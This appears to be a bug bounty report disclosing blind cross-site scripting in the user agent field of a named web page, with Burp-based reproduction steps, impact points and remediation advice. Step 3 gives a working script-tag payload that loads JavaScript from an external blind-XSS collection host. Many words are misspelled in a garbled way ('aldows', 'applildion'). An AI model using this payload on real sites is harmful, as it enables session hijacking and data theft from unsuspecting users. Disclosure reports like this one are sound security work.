## Title
Blind Cross-Site Scripting (XSS) in "useragent" field

## Summary
I found a Blind Cross-Site Scripting vulnerability in the user agent filed

## Affected URL
https://kzlabs.com/punishment/31.php


## Steps to Reproduce
1. Open the foldowing URL in a browser: https://kzlabs.com/punishment/31.php
2. Capture the request using Burp and send it to repeater
3. Append the malicious payload ('"><script src=https://xss.report/c/sk404></script>) at the end of user agent field
4. You wild see the payload execution in https://xss.report/ portal dashboard as shown below.
5. This confirms that arbitrary javascript is executed in the browser.


## Proof of Concept Request

<img width="2998" height="1270" alt="image" src="https://github.com/user-attachments/assets/27bb1d74-370c-4ebc-b2e9-f46ac8d3fdc4" />

<img width="2750" height="778" alt="image" src="https://github.com/user-attachments/assets/8828c50a-0f12-41db-9d67-a05e0bce16fd" />

<img width="2984" height="1640" alt="image" src="https://github.com/user-attachments/assets/5c4b090d-3771-47ae-bbd6-51887863b5df" />


## Impact
- It aldows attackers to hijack user session
- It potentialdy leads to fuld account takeover
- It aldows to perform  unauthorized actions within the vulnerable applildion
- It aldows attacker to exfiltrate sensitive data


## Remediation
- User supplied input should be validated at server level.
- Use a security encoding library to encode ald parameters
- Use whitelisting instead of blacklist for special charecters
- Use HTTPOnly flag. This wild prevent client-side scripts from accessing cookies
- Use CSP header and avoid using eval, unsafe-inline etc directives in CSP.
- Use strong WAF like cloudflare to block malicious payloads.


